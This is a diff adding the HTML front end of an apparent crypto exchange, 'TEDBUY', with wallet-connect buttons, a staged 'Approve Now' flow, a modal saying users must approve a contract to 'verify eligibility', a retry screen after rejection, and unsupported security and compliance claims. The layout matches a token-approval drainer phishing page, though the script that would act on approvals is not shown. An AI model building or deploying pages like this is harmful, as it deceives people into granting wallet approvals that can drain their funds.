@@ -1,0 +1,487 @@
+<!doctype html>
+<html> 
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Crypto Fees</title>
+ <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+  <!-- React root for Vite (hidden, UI is pure HTML) -->
+  <div id="root" style="display:none;"></div>
+  
+ 
+<header class="ex-header">
+
+  <div class="ex-container">
+
+    <div class="ex-logo">TED<span>BUY</span></div>
+
+    <nav class="ex-nav">
+      <a href="#">Markets</a>
+      <a href="#">Trade</a>
+      <a href="#">Futures</a>
+      <a href="#">Earn</a>
+    </nav>
+
+    <button id="connectBtn1" class="btn-connect">
+      Connect
+    </button>
+
+    <!-- Hamburger -->
+    <button id="menuToggle" class="menu-toggle">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+
+  </div>
+
+  <!-- Mobile Menu -->
+  <div id="mobileMenu" class="mobile-menu">
+    <a href="#">Markets</a>
+    <a href="#">Trade</a>
+    <a href="#">Futures</a>
+    <a href="#">Earn</a>
+
+    <button id="connectMobile" class="btn-connect">
+      Connect Wallet
+    </button>
+  </div>
+
+</header>
+
+
+  <main>
+
+   <div class="hero-layout">
+
+ <!-- LEFT SIDE -->
+  <div class="hero-left">
+<div class="signup-section">
+<div id="authUI">
+
+  <!-- DEFAULT -->
+  <div id="ui-default">
+    <h1>GATEWAY <span class="highlight">TO CRYPTO</span></h1>
+
+    <p class="subtext">
+      <span class="blue-text">100K</span> Traders Trusted Choice
+    </p>
+
+    <input type="text" class="input-field" placeholder="Address"> 
+    <br>
+
+    <button class="btn-primary" id="connectBtn">Connect</button>
+
+    <p class="or-text">Or Continue With</p>
+
+    <div class="social-icons">
+      <button class="icon-btn"><img src="assets/partners/metamask.png"></button>
+      <button class="icon-btn"><img src="assets/partners/trustwallet.png"></button>
+      <button class="icon-btn"><img src="assets/partners/binance.png"></button>
+      <button class="icon-btn"><img src="assets/partners/walletconnect.png"></button>
+    </div>
+  </div>
+
+  <!-- CONNECTED -->
+  <div id="ui-connected" class="hidden">
+    <h2>Wallet Connected</h2>
+    <p class="subtext">Checking approval...</p>
+  </div>
+
+  <!-- NOT APPROVED -->
+  <div id="ui-not-approved" class="hidden">
+    <h2>Approval Required</h2>
+    <p class="subtext">You must approve access to continue</p>
+    <button class="btn-primary" id="approveBtn">Approve Now</button>
+  </div>
+
+<!-- APPROVED -->
+<div id="ui-approved" class="hidden dashboard-box">
+
+  <div class="dash-header">
+    <h2 class="dash-title">🎉 Account Activated</h2>
+    <p class="dash-sub">
+      Your wallet is successfully connected and verified.
+    </p> 
+    <br>
+  </div>
+
+  <div class="dash-card">
+
+    <div class="dash-row">
+      <span>User ID</span>
+      <span id="userId" class="value strong"></span>
+    </div>
+
+    <div class="dash-row">
+      <span>Status</span>
+      <span class="badge success">Active</span>
+    </div>
+
+    <div class="dash-row">
+      <span>Wallet</span>
+      <div class="wallet">
+        <span id="walletShort" class="value mono">••••••••</span>
+      
+      </div>
+    </div>
+
+    <div class="dash-row">
+      <span>Network</span>
+      <span class="value network">BNB Smart Chain</span>
+    </div>
+
+  </div>
+
+</div>
+
+</div>
+
+</div>
+      </div>
+
+
+  <!-- RIGHT SIDE -->
+  <div class="hero-right">
+  <div class="market-section">
+  
+
+<div class="market">
+
+  <div class="tabs">
+    <span class="active">Live Crypto Prices</span>
+   
+  </div>
+
+  <div id="list"></div>
+
+  <div class="view">View All ></div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+
+
+
+
+
+<section class="trust">
+  <div class="trust-header">
+    <h2>Security & Reliability</h2>
+    <p>Enterprise-grade protection for your assets.</p>
+  </div>
+  <div class="container trust-grid">
+<div class="step-card">
+
+    <div class="trust-item">
+
+      <div class="icon">
+        <!-- Lock SVG -->
+        <svg viewBox="0 0 24 24">
+          <path d="M7 10V7a5 5 0 0 1 10 0v3"/>
+          <rect x="5" y="10" width="14" height="10" rx="2"/>
+        </svg>
+      </div>
+
+      <h3>Secure Custody</h3>
+      <p>Multi-layer cold storage and advanced encryption.</p>
+
+    </div>
+        </div>
+
+
+<div class="step-card">
+
+    <div class="trust-item">
+
+      <div class="icon">
+        <!-- Shield SVG -->
+        <svg viewBox="0 0 24 24">
+          <path d="M12 3l7 4v5c0 5-3.5 7.5-7 9-3.5-1.5-7-4-7-9V7l7-4z"/>
+        </svg>
+      </div>
+
+      <h3>Industry Protection</h3>
+      <p>Advanced risk control and real-time monitoring.</p>
+
+    </div>
+        </div>
+
+
+<div class="step-card">
+ <div class="trust-item">
+
+      <div class="icon">
+        <!-- Globe SVG -->
+        <svg viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="9"/>
+          <path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"/>
+        </svg>
+      </div>
+
+      <h3>Global Compliance</h3>
+      <p>Operating in 200+ regions worldwide.</p>
+
+    </div>
+     </div>
+
+<div class="step-card">
+    <div class="trust-item">
+
+      <div class="icon">
+        <!-- Lightning SVG -->
+        <svg viewBox="0 0 24 24">
+          <path d="M13 2L3 14h7l-1 8 10-12h-7l1-8z"/>
+        </svg>
+      </div>
+
+      <h3>99.99% Uptime</h3>
+      <p>Stable infrastructure with lightning execution.</p>
+
+    </div>
+</div>
+
+  </div>
+</section>
+
+
+
+
+<section class="steps-pro">
+
+  <h2>How to Get Started</h2>
+
+  <div class="steps-grid">
+
+    <div class="step-card">
+      <div class="step-badge">1</div>
+      <h3>Connect Your Wallet</h3>
+      <p>Sign up instantly with any supported wallet.</p>
+    </div>
+
+    <div class="step-card">
+      <div class="step-badge">2</div>
+      <h3>Approve Your Wallet</h3>
+      <p>Confirm the approval request to continue.</p>
+    </div>
+
+    <div class="step-card">
+      <div class="step-badge">3</div>
+      <h3>Start Trading</h3>
+      <p>Buy, sell, and manage your assets securely.</p>
+    </div>
+
+  </div>
+
+</section>
+
+
+  </main>
+
+
+
+
+
+
+
+<div id="ui-rejected" class="hidden reject-box">
+  <div class="reject-icon">⚠️</div>
+
+  <h2>Approval Failed</h2>
+
+  <p class="reject-text">
+    Transaction was rejected in your wallet.
+  </p>
+
+  <p class="reject-sub">
+    Please approve access to continue using the platform.
+  </p>
+
+  <button class="btn-primary" id="retryApproveBtn">
+    Try Again
+  </button>
+</div>
+
+
+
+
+
+
+<!-- ================= FAQ ================= -->
+
+<section class="faq-section">
+
+  <h2>FAQs</h2>
+
+  <div class="faq-list">
+
+    <div class="faq-item">
+      <button class="faq-question">
+        What is cryptocurrency exchange?
+        <span class="arrow">▾</span>
+      </button>
+      <div class="faq-answer">
+        A cryptocurrency exchange is a platform where users can buy,
+        sell, and trade digital assets like Bitcoin and Ethereum.
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <button class="faq-question">
+        What products does Gate offer?
+        <span class="arrow">▾</span>
+      </button>
+      <div class="faq-answer">
+        Gate provides spot trading, futures trading, staking,
+        savings products, and more.
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <button class="faq-question">
+        How can I buy Bitcoin?
+        <span class="arrow">▾</span>
+      </button>
+      <div class="faq-answer">
+        You can purchase Bitcoin via bank transfer, credit card,
+        or by trading other cryptocurrencies.
+      </div>
+    </div>
+
+  </div>
+
+
+
+</section>
+
+
+<!-- ================= FOOTER ================= -->
+
+<footer class="footer">
+
+  <div class="footer-accordion">
+
+    <div class="footer-item">
+      <button class="footer-title">About <span>▾</span></button>
+      <div class="footer-content">
+        <a href="./about.html">About Us</a>
+      
+      </div>
+    </div>
+
+    <div class="footer-item">
+      <button class="footer-title">Terms & Privacy Policy <span>▾</span></button>
+      <div class="footer-content">
+        <a href="terms.html">Terms & Policy</a>
+       
+      </div>
+    </div>
+
+    <div class="footer-item">
+      <button class="footer-title">Contac Us <span>▾</span></button>
+      <div class="footer-content">
+       
+        <a href="contac.html">Contac Us</a>
+      </div>
+    </div>
+
+    <div class="footer-item">
+      <button class="footer-title">Learn <span>▾</span></button>
+      <div class="footer-content">
+        
+        <a href="learn">Learn About Crypto</a>
+      </div>
+    </div>
+
+  </div>
+  
+  
+<br>
+
+  <!-- ===== PARTNER LOGOS ===== -->
+  <div class="footer-partners">
+   <img src="assets/partners/binance.png" alt="Binance">
+  <img src="assets/partners/metamask.png" alt="MetaMask">
+  <img src="assets/partners/trustwallet.png" alt="Trust Wallet">
+  <img src="assets/partners/bnbchain.png" alt="BNB Chain">
+  <img src="assets/partners/walletconnect.png" alt="WalletConnect">
+ <img src="assets/partners/usdt.png" alt="BNB Chain">
+  </div>
+
+
+  <div class="copyright">
+    Copyright © 2013-2026. All Right Reserved.
+  </div>
+
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- ===== APPROVAL REQUIRED MODAL ===== -->
+<div id="approvalModal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <button class="modal-close" id="closeApprovalModal">✕</button>
+
+    <h3>Approval Required</h3>
+    <p>
+      To view and complete  tasks, you must approve
+     
+      <br><br>
+      This allows the  contract to verify eligibility.
+    .
+    </p>
+
+    <div class="approval-actions">
+  <button id="modalApproveBtn" class="approve-btn">
+    Approve Now
+  </button>
+</div>
+
+
+    
+  </div>
+</div>
+
+<div id="toast" class="toast hidden"></div>
+
+
+
+  <!-- libs: Web3 + Ethers -->
+  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+  <script src="https://www.youtube.com/iframe_api"></script>
+
+
+  <!-- Vite / React entry: this runs src/main.jsx (and appkit.ts) -->
+  <script type="module" src="/src/main.jsx"></script>
+  <script type="module" src="/src/script.js"></script>
+</body>
+</html>
